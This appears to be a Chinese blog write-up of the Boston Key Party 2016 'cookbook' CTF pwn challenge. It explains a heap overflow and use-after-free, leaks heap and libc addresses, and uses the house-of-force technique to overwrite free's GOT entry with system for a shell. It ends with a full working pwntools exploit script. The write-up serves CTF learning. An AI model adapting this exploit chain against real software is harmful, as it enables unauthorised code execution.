---
title: boston key party 2016 cookbook
categories:
  - pwn
tags: house-of-force
published: true
---

# Introduction

知识点：

[house_of_force](https://github.com/shellphish/how2heap/blob/master/house_of_force.c)


**[cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)**

./cookbook: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter
/lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2397d3d3c3b98131022ddd98f30e702bd4b88230, stripped

{% highlight bash %}

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

{% endhighlight %}

对程序进行过逆向分析后发现在函数 `0x8049092` 处有 `0x8c` 字节的堆溢出，也就是 create recipe 子菜单中的 `g` 或
`i` 命令。

# Leak Heap

我的思路分为三步，要想实施 house of force 攻击，必须知道 top chunk 地址，也就是要 leak 堆地址，在分析的过程中
发现在程序的 create recipe 功能中有一处 uaf，利用这个 uaf 我们可以泄露堆地址。

```
p.sendline("c")
p.sendline("n") # calloc 0x40c 大小的 chunk
p.sendline("a") # 添加一些 chunk 作为 “隔层”
p.sendline("water")
p.sendline("0x1")
p.sendline("d") # 将 large chunk 释放掉，其 fd 和 bk 会指向 top chunk
p.sendline("p") # 触发 uaf，泄露 top chunk 地址
```

# Leak Libc

接下来就要实施 house of force 来完成后续的地址读取和写入，使用 house of force 我们可以改写程序 bss 段的变量，
像是存放 chef's name 指针的 `0x804d0ac` 处，将其改写为 got 表地址即可泄露 libc。

```
p.sendline("g")
p.recvuntil("hacker!) :")
p.sendline(hex(0x20))
payload = p32(free_got-0x8c)    # 此处为写 system 做准备
payload += p32(0)*2
payload += p32(calloc_got)  # 泄露 calloc_got 表地址
p.sendline(payload)

p.recvuntil("[q]uit\n")
p.sendline("r") # 打印 cookbook 信息
```

# Exploit

老套路，写 free 为 system。

**[exp](https://github.com/0x3f97/pwn/blob/master/boston-key-party-2016/cookbook-6/exp.py)**:

```
#!/usr/bin/env python

from pwn import *
import sys

context.log_level = "debug"

elf = "./cookbook"

recipe_addr = 0x804d0a0
calloc_got = 0x804d048
free_got = 0x804d018
calloc_off = 0x71810
system_off = 0x3ada0

p = process(elf)

p.recvline("what's your name?")
p.sendline("test")

p.recvuntil("[q]uit\n")

# leak heap

p.sendline("c")
p.sendline("n")
p.sendline("a")
p.sendline("water")
p.sendline("0x1")
p.sendline("d")
p.sendline("p")

p.recvuntil("recipe type: (null)\n\n")
top_chunk_addr =  int(p.recv(9))
heap_base = top_chunk_addr - 0x16d8
log.info("top_chunk_addr: "+hex(top_chunk_addr))
log.info("heap_base: "+hex(heap_base))

# leak libc
p.sendline("n")
p.sendline("g")
payload = p8(0)*0x3a0
payload += p32(0xffffffff)
p.sendline(payload)

off_size = recipe_addr - (top_chunk_addr + 0x4) - (2 * 0x4)

p.sendline("q")
p.sendline("g")
p.recvuntil("hacker!) :")
p.sendline(hex(off_size))
p.sendline()

p.sendline("g")
p.recvuntil("hacker!) :")
p.sendline(hex(0x20))
payload = p32(free_got-0x8c)
payload += p32(0)*2
payload += p32(calloc_got)
p.sendline(payload)

p.recvuntil("[q]uit\n")
p.sendline("r")
libc_base = u32(p.recv(4))-calloc_off
log.info("libc_base: "+hex(libc_base))

# write system

p.recvuntil("[q]uit\n")
p.sendline("c")
p.sendline("g")

system_addr = libc_base+system_off
p.sendline(p32(system_addr))

#gdb.attach(p)
p.recvuntil("[q]uit\n")
p.sendline("q")
p.sendline("g")
p.sendline(hex(0x10))
p.sendline("/bin/sh")
p.recvuntil("[q]uit\n")
p.sendline("q")

p.interactive()
```
